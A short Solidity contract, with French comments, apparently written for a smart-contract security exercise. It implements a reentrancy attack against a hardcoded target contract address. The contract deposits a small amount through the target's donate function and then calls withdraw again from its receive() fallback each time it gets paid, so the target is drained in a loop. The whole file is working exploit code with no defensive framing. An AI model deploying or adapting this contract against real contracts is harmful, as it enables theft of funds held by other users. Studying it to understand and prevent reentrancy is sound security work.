// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface Reentrancy {
    function withdraw(uint256 _amount) external;

    function donate(address _to) external payable;
}

contract ReentrancyAttack {
    address reentrancyAddress = 0x31D28B4B87864673E5A8604B953B820c0D82dDbB;
    Reentrancy reentrancyContract = Reentrancy(reentrancyAddress);

    function donate() external payable {
        // donne 1000000000000000 wei au contrat
        // address(this) est l'adresse de du contrat
        reentrancyContract.donate{value: msg.value}(address(this));
    }

    function withdrawAll() public {
        reentrancyContract.withdraw(1000000000000000);
    }

    receive() external payable {
        withdrawAll();
    }
}
